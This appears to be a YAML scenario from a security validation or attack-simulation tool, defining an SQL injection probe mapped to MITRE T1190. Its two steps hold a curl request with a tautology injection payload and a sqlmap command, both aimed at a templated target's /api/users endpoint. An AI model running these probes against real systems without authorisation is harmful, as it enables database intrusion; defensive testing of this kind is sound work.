id: scn-sqli-04
name: Exploit Public-Facing Application (SQL Injection Probe)
description: Automated SQL injection security validation against web endpoints.
mitre_tactic: TA0001
mitre_technique: T1190
required_services: ["80", "443", "8080", "http", "web"]
steps:
  - step: 1
    action: "curl -s -m 5 'http://{TARGET}:8080/api/users?id=1%27+OR+%271%27=%271'"
    tool: "curl"
    delay_ms: 1200
    expected_output: "[*] HTTP 200 response with parameters inspected for injection patterns"
  - step: 2
    action: "sqlmap -u 'http://{TARGET}:8080/api/users?id=1' --batch --banner"
    tool: "sqlmap"
    delay_ms: 1400
    expected_output: "[*] SQLMap probe executed against target endpoint"
